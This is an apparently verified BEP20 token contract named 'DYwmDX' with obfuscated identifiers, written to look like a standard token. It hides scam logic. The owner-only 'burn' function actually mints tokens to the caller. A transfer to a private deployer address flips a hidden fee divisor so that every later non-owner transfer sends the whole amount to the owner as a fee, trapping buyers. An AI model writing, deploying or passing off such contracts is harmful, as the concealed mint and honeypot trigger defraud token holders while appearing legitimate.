/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.3;
contract DYwmDX {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  HMHSny = 100000000000000000;
uint8 public constant decimals = 18;
uint256 public  tWxXFT = 10000000000000000;
address public  yntZkq = address(0);
address public  vTPhNA = address(0);
uint256 public  wQZGgd = 1000000000000000000;
uint256 public  vLudxH = 100000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  kDwjGu = 10000000000000000000000000000;
uint256 public  ASsZbS = 10000000000000000000;
uint256 public  vZSJJs = 100000000000000000000000;
address private  ihWfti = address(0);
address public  KvMUzZ = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "DYwmDX";
address public  NnLmCz = address(0);
address public owner;
address public  BfDWUs = address(0);
uint256 public constant pJVMnZ = 9+1;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  qDrrSI = address(0);
uint256 private  uxXnMt = 10000000000000;
mapping (address => uint256) public balanceOf;
string public  name = "DYwmDX";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  BOzUYN = 100000000000000000000000;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "IQlvlW");
require(to != address(0), "IQlvlW");
require(amount <= balanceOf[from], "IQlvlW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* pJVMnZ/uxXnMt ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ihWfti){
uxXnMt = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () public {
ihWfti = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safescan: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safescan: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safescan: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safescan: division by zero");
    }
		function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "Safescan: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

}